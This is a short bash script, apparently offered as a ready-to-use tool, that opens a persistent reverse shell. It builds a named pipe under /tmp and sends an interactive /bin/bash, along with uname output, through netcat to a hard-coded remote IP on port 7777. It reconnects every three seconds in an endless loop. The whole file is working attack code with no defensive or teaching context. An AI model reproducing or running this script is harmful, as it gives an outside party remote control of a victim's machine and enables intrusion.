#!/bin/bash
# BASH reverse shelll
# Created by: Z3U5

OPTIONS=$1

if [ "$OPTIONS" = "bind" ]
then
	LHOST=$2
	LPORT=$3

	rm -rf /tmp/zeus*

	while true
	do
		mkfifo /tmp/zeusPipe

		cat /tmp/zeusPipe|$0 shell 2>&1|nc $LHOST $LPORT >/tmp/zeusPipe
		sleep 3

		rm -rf /tmp/zeus*
	done

elif [ "$OPTIONS" = "shell" ]
then
	echo "[+] spawning shell.."
	uname -a
	echo ""
	echo ""
	/bin/bash

else
	LHOST="95.165.8.178"
	LPORT="7777"

	# Start Bind
	$0 bind $LHOST $LPORT
fi
